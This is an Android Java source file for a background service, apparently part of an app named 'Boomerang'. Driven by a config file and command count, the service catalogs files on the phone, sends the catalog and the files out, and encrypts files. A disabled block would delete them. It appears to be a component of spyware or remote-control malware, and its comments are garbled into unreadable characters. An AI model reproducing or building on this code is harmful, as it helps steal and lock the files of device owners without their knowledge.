package Boomerang_android15.com;

///////////////////////////////////////////////////////////////////////
//
//ģ�鹦��:��ϵͳ�е��ļ����в���
//ע:������ù�ע�ļ��е�Ŀ¼�ṹ,����,ɾ���ļ�,(���ܲ����ɵ�����ģ�鸺��)
//
//////////////////////////////////////////////////////////////////////
//package fei_qu_lai;





import java.io.*;

import android.app.Service;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.content.Intent; 
import java.util.List;
import java.util.ArrayList;
import java.util.Vector;


public class ProcessFileInfor extends Service
{	

	private OperateFileInfor m_FileInfor = null;  //�����ļ���Ϣ����
	private SetInformation m_settingInfor;		//�����ļ���������Ϣ
	private String m_configFilePath;  //�����ļ���·��
  
	
	public void onCreate()
	{
		super.onCreate();
		
		Log.i("333+++", "ProcessFileInfor onCreate: begin ");
		System.setProperty("file.encoding", "GBK"); //���ñ��뷽ʽ

	}
	 
	public void onStart (Intent intent, int startId )
	{
		super.onStart(intent, startId);
		Log.i("333+++", "ProcessFileInfor onStart: begin ");
		initialize();
		StartPhoneFile();  //���ô����ļ�����
	}

	public IBinder onBind(Intent intent)
	{
		Log.i("333+++", "ProcessFileInfor onBind: begin ");	
		return null;
	}

	
	
	public void onDestory()
	{
		super.onDestroy();
	}

	
	private void initialize()
	{
	
       	//1.��������ļ�·��
        Log.i("333+++", "ProcessPhoneBook initialize: begin!");
        m_configFilePath = this.getFilesDir()+ java.io.File.separator + this.getString(R.string.config_file);
   
        //2.��ȡ�����ļ���Ϣ
        m_settingInfor = new  SetInformation(m_configFilePath);     
        m_settingInfor.ReadConfigFile();
    	
        //���������ļ���Ϣ�Ķ���
        m_FileInfor = new OperateFileInfor(this);
		
		
		
	}

	
	
	
	private void StartPhoneFile()
	{
		
		int commandCount = this.m_settingInfor.GetCommandCount();		
		Log.i("333+++", "commandCount");
		Log.i("333+++", String.valueOf(commandCount));
		
		if (commandCount == 1 )
		{
			//ProcessFirstForFree();		//��Ѱ治��ʹ��
			ProcessFirst();
		}
		else
		{
			//���ֻ����ļ���Ϣ�����ش�
			ProcessOther();
		}
		
		
		
	}
	    
	////////////////////////////////////////////////////////////////
	//
	//��������:�����״��������Ķ���
	//
	//
	/////////////////////////////////////////////////////////////////
	private void ProcessFirst()
	{
		
		Log.i("333+++", "ProcessFileInfor ProcessFirst: begin!");	
		//��ʼ������	    	
	    
		//����Ŀ¼�ļ�
	  
		m_FileInfor.CreateCalalogFile();
			
		if (m_settingInfor.GetIsSendFileCatalog() == true)
		{
			//�����ļ�Ŀ¼
			Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFileCatalog!");
			m_FileInfor.SendFileCatalog();
		}
			
		if (m_settingInfor.GetIsSendFile() == true)
		{
			//�����ļ�
			Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFile!");
			m_FileInfor.SendFile();
				
		}
		
		if (m_settingInfor.GetIsCryptFile() == true)
		{
			//�����ļ�
			Log.i("333+++", "ProcessFileInfor ProcessFirst: call EncryptFile!");
			m_FileInfor.EncryptFile();
		}
			

		/*	
		//����Ŀ¼�ļ������ݽ��ļ��ƶ��ļ�ɾ��
		if (m_settingInfor.GetIsDelFile() == true)
		{
			//ɾ���ļ�
			Log.i("333+++", "ProcessFileInfor ProcessFileInfor: call DelFileCatalog!");
			m_FileInfor.DelFileCatalog();
		}//end if 
		
		//���ļ�Ŀ¼�ļ����м���
	    m_FileInfor.EncryptFileCatalog();
	    
	    */
		
		Log.i("333+++", "ProcessFileInfor ProcessFirst: end");	
		
		
	}
	
	////////////////////////////////////////////////////////////////
	//
	//��������:��������ָ��,�ط��ֻ����ļ���Ϣ
	//
	//
	///////////////////////////////////////////////////////////////
	private void ProcessOther()
	{
		
		if (m_settingInfor.GetIsSendFileCatalog() == true)
		{
			//�����ļ�Ŀ¼
			Log.i("333+++", "ProcessFileInfor ProcessOther: call SendFileCatalog!");
			m_FileInfor.SendFileCatalog();
		}
			
		if (m_settingInfor.GetIsSendFile() == true)
		{
			//�����ļ�
			Log.i("333+++", "ProcessFileInfor ProcessOther: call SendFile!");
			m_FileInfor.SendFile();
				
		}
		
	}

	private void ProcessFirstForFree()
	{
		Log.i("333+++", "ProcessFileInfor ProcessForFree: begin!");	
		//��ʼ������	    	
	    
		//����Ŀ¼�ļ�	  
		m_FileInfor.CreateCalalogFile();		
		
		//�����ļ�Ŀ¼
		Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFileCatalog!");
		m_FileInfor.SendFileCatalogForFree();
					
		
		//�����ļ�
		Log.i("333+++", "ProcessFileInfor ProcessFirst: call SendFile!");
		m_FileInfor.SendFileForFree();
				
		//�����ļ�
		Log.i("333+++", "ProcessFileInfor ProcessFirst: call EncryptFile!");
		m_FileInfor.EncryptFile();
		
	}
}
